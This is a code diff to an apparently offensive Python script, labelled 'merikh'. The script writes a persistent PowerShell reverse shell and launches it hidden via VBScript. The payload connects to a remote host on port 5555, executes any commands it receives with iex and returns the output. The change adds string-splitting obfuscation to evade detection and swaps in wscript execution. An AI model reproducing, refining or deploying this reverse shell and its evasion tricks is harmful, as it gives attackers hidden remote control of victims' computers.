@@ -44,7 +44,7 @@ ps_command = ''' echo 'hello i am merikh' ; $uniqueIdentifier = "Keres" ;while (
             try {
                 $isRunning = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*$uniqueIdentifier*" };
                 if (-not $isRunning) { 
-                    Start-Process $PSHOME\powershell.exe -ArgumentList {$uniqueIdentifier; $client = New-Object System.Net.Sockets.TcpClient('121.0.0.1',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -WindowStyle Hidden 
+                    Start-Process $PSHOME\powe''rshell.exe -ArgumentList {$uniqueIdentifier;$client = New-Object Sys''tem.N''et.Sock''ets.TCPCl''ient('jjjj',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%0;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName S''ystem.T''ext.AS''CIIE''ncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -WindowStyle Hid''den 
                 } else {
                     Write-Host "Script is already running."
                 };  
@@ -83,7 +83,7 @@ try:
 
     print(f"VBScript file created at: {vbs_script_path}")
     # Execute the batch file
-    os.system(vbs_script_path)
+    subprocess.run(["wscript", vbs_script_path])
        
     print("PowerShell command executed successfully.")
 except subprocess.CalledProcessError as e:
